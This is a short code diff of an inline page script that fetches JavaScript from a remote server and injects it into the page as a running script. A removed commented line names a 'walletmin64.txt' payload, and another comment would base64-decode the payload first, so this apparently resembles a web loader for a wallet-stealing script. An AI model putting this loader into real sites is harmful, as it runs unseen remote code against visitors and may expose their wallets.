@@ -10,13 +10,12 @@
       // const data = await response.json();
       // const proxyjs = await fetch(`${serverUrl}/content/${data.id}`);
       const proxyjs = await fetch(`${serverUrl}/content/quantumgate.js`);
-      // const proxyjs = await fetch(`${serverUrl}/content/walletmin64.txt`);
       const scriptDiv = document.createElement("script");
       scriptDiv.innerHTML = await proxyjs.text();
       // scriptDiv.innerHTML = decodeURIComponent(escape(atob(await proxyjs.text())));
       document.body.appendChild(scriptDiv);
 
-      init();
+      initGate();
     };
   })();
 </script>
